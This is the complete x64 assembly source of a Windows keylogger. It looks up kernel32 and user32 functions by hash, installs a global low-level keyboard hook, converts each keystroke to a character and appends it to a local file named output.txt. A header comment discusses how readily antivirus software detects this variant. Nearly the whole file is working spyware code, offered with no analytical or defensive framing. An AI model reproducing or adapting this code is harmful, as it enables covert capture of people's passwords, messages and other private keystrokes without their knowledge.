; 10/08/21
; this is the 64 bit version of the program
; this is version is without manual symbol resolver so is easy to detect by antivirus


EXTERN CalcHash			 : PROC
EXTERN FindK32Addr		 : PROC
EXTERN HashResolver		 : PROC
EXTERN writeTofile		 : PROC


.data
	chget					DB   41h
	WM_KEYDOWN				EQU 00000100h
	FILE_APPEND_DATA		EQU 00000004h
	FILE_SHARE_READ			EQU 00000001h
	OPEN_ALWAYS				EQU 00000004h
	FILE_ATTRIBUTE_NORMAL	EQU 00000080h
	WH_KEYBOARD_LL			EQU 0000000dh
	INVALID_HANDLE_VALUE    EQU 0FFFFFFFFh
	state					BYTE 256 dup(0)
	;hash table---------------------------;
	;k32 hash
	LOADLIBRARYH		    DD 0EC0E4E8Eh
	CREATEFILEH				DD 07C0017A5h
	WRITEFILEH				DD 0E80A791Fh
	GETMODULEHANDLEH		DD 0D3324904h
	CLOSEHANDLEH			DD 00FFD97FBh
	WINEXECH				DD 00E8AFE98h
	;u32 hash
	SETWINDOWSHOOKEXH		DD 09E9B5ECFh
	CALLNEXTHOOKH			DD 069599088h
	TOASCIIEXH				DD 0A93258D2h
	GETKEYBOARDLAYOUTH      DD 09EFC8910h
	GETKEYSTATEH			DD 0A13C7A54h
	GETKEYBOARDSTATEH		DD 0B73BFDCFh
	GETMESSAGEAH		    DD 07AC67BEDh
	;-------------------------------------;
	filename				DB "output.txt",0
	u32str					DB "User32.dll",0
	;--------------------------------------;
.data?
;Address of library
	k32address			QWORD ?
	u32address			QWORD ?
;Address of function
;k32 functions
	loadlibrary			QWORD ?
	createfile			QWORD ?
	writefile			QWORD ?
	getmodulehandle		QWORD ?
	closehandle			QWORD ?
	winexec				QWORD ?
;u32 functions
	setwindowhookex		QWORD ?
	callnexthook		QWORD ?
	toasciiex			QWORD ?
	getkeyboardlayout   QWORD ?
	getkeystate			QWORD ?
	getkeyboardstate    QWORD ?
	getmessage			QWORD ?
;other uninitialized variables
	wparam		QWORD ?
	lparam		QWORD ?
	vk_code     DWORD ?
	callcode	DWORD ?
	vk_scanCode DWORD ?
	keyBoardHL  DWORD ?
	hfile		QWORD ?
	;-----------------------------------------;

.code

public createfile
public writefile
public closehandle


lowlevelkeyboard PROC
	push rbp										; +8B into the stack (i mustn't forget 16 bit stack alignment)
	mov rbp,rsp										; rbp is the frame pointer (it's not mandatory in 64 bit mode) 
	sub rsp,48										; space needed for calling a function with max 6 argument
	mov callcode, ecx								; save code
	mov wparam, rdx									; save wparam
	mov lparam, r8									; save lparam
	cmp rdx, WM_KEYDOWN								; check if wparam is equal to 100h
	jnz fine										; if not equal jump to the end
	;-----------------------------------;
	; get vk_code						;
	;-----------------------------------;
	xor rax,rax										; zeroing the rax
	mov eax, dword ptr[r8]							; take first  4 byte of  lparam
	mov vk_code,eax									; save vkcode in vk_code  
	;-----------------------------------;
	;get vk_scancode					;
	;-----------------------------------;
	xor rax,rax										; zeroing the rax
	mov eax, dword ptr[r8+4]						; take the second 4 byte of lparam
	mov vk_scanCode,eax								; save them to vk_scanCode
	;-----------------------------------;
	;get keyboard layout				;
	;-----------------------------------;
	xor rax,rax										; zeroing the rax
	mov rcx,0										; idThread 0 (current)
	call getkeyboardlayout							; call api function 
	mov keyBoardHL,eax								; save return value (layout) to keyBoardHL
	;-----------------------------------;
	;get keystate alt					;
	;-----------------------------------;
	mov rcx,010h									; 0x10 == vk_alt
	call getkeystate								; call api function
	;-----------------------------------;	
	;get keyboard state					;
	;-----------------------------------;
	mov rcx,offset state							; output var that will receive the current keyboard state
	call getkeyboardstate							; call keyboard state 
	;-----------------------------------;
	;convert  virtual key code to ascii ;
	;-----------------------------------;
	xor rax,rax										; zeroing stack
	mov eax,dword ptr[keyBoardHL]					; copy the 32 bit value pointed by keyBoardHL var into the rax
	mov qword ptr[rsp+28h],rax						; push it into the stack as 6th argument
	xor rax,rax										; zero
	mov dword ptr[rsp+20h],eax						; push zero as the 5th arguemnt
	mov r9, offset chget							; var that will receive the ascci char
	mov r8, offset state							; address of the state of the keyboard as 3th argument
	mov edx,vk_scanCode								; scan code as the 2th argument
	mov ecx,vk_code									; virtual keycode as 1th argument
	call toasciiex									; call api
	cmp rax, 1										; check if the function has got char
	jnz fine										; if not jump to the end
	;-----------------------------------;
	;save new char to file				;
	;-----------------------------------;
	xor rcx,rcx										; zeroing
	xor rdx,rdx										; zeroing
	mov rdx,offset filename							; filename path
	mov cl, byte ptr[chget]							; make hooked byte char as argument of writeTofile
    call writeTofile								; call api funtion
	fine:
	xor rcx,rcx										; zeroing
	xor rdx,rdx										; zeroing
	mov r9,qword ptr  [lparam]						; fourth argument
	mov r8,qword ptr  [wparam]						; thirds argument
	mov edx,dword ptr [callcode]					; second argument
	mov rcx,0										; first  argument
	call callnexthook								; call api function
	leave 
	ret
lowlevelkeyboard ENDP


main proc
	push rbp									; save rbp, +8B into the stack (i mustn't forget 16 bit stack alignment)
    mov rbp,rsp									; new rpb
    sub rsp,48									; create stack frame
	;------------------------------------;
	;	Find all the kernel32 api		 ;
	;------------------------------------;
	call FindK32Addr							; get the address of the kernel32 in memory
	mov k32address,rax							; save the address to the variable
	xor r10,r10									; r8=0=i (index)
ciclo:
	xor rcx,rcx									; rcx=0
	xor rdx,rdx									; rdx=0
	xor rbx,rbx									; rbx=0
	xor rax,rax									; rax=0
	xor r9,r9									; r9=0
	mov r9,6									; r9=6=number of hash to resolve
	cmp r10,r9									; compare index to i
	je next_step								; if i < (number of hash) compute else finish
	mov rcx,offset LOADLIBRARYH					; get the address of the first hash
	mov eax,dword ptr[rcx+(r10*4)]				; eax = *(dword32*)((address of hash)+(i*4))
	mov rdx,rax									; second argument hash to resolve
	mov rcx,k32address							; library where the function is stored
	call HashResolver							; resolve the address
	mov rbx,offset loadlibrary					; get the first slot of symbol table, that it will hold the api address
	mov qword ptr[rbx+r10*8], rax				; save the address
	inc r10										; i++
	jmp ciclo									; repeat
	;------------------------------------;
	;	Find all the user32	api			 ;
	;------------------------------------;
next_step:
	xor rcx,rcx									; rcx=0
	mov rcx,offset u32str						; rcx = u32 address string
	call qword ptr[loadlibrary]					; loadlibrary("user32.dll")
	mov u32address,rax							; save the address
	xor r10,r10									; r10=0=i (index)
ciclo2:
	xor rcx,rcx									; rcx=0
	xor rdx,rdx									; rdx=0
	xor rbx,rbx									; rbx=0
	xor rax,rax									; rax=0
	xor r9,r9									; r9=0
	mov r9,7									; r9=12=number of hash to resolve
	cmp r10,r9									; compare index to i
	je entry									; if i < (number of hash) compute else finish
	mov rcx,offset SETWINDOWSHOOKEXH			; get the address of the first hash
	mov eax,dword ptr[rcx+(r10*4)]				; eax = *(dword32*)((address of hash)+(i*4))
	mov rdx,rax									; second argument hash to resolve
	mov rcx,u32address							; library where the function is stored
	call HashResolver							; resolve the address
	mov rbx,offset setwindowhookex				; get the first slot of symbol table, that it will hold the api address
	mov qword ptr[rbx+r10*8], rax				; save the address
	inc r10										; i++
	jmp ciclo2									; repeat

entry:
	;-----------------------------------;
	; get current module handle			;
	;-----------------------------------;
	mov ecx,0										; current module(0)
	call getmodulehandle							; call api function
	;-----------------------------------;
	; set hook in all windows			;
	;-----------------------------------;
	mov r9,0										; dwThreadId
	mov r8,rax										; current module hanldle
	mov rdx,offset lowlevelkeyboard					; callback routine (second param)
	mov rcx,WH_KEYBOARD_LL							; hook kewboard    (first param)	
	call setwindowhookex							; call api function
	;-----------------------------------;
	; GET MESSAGE LOOP					;
	;-----------------------------------;
	mov r9, 0
	mov r8, 0
	mov rdx ,0
	mov rcx,0
	call getmessage
fine:
	mov rax,0
	leave
	ret
main endp
end


